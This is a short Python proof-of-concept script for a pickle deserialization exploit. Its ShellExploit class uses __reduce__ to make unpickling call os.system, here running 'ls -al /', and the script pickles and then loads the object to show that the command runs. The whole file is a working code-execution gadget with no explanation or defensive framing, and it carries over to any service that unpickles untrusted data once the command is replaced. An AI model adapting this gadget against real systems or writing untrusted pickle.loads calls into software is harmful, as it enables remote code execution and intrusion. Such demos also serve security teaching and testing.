import os
import pickle

class ShellExploit(object):
   def __reduce__(self):
        return (os.system, ('ls -al /',))

def serialize():
    shellcode = pickle.dumps(ShellExploit())
    return shellcode
def deserialize(exploit_code):
    pickle.loads(exploit_code)

if __name__ == '__main__':
    shellcode = serialize()
    deserialize(shellcode)
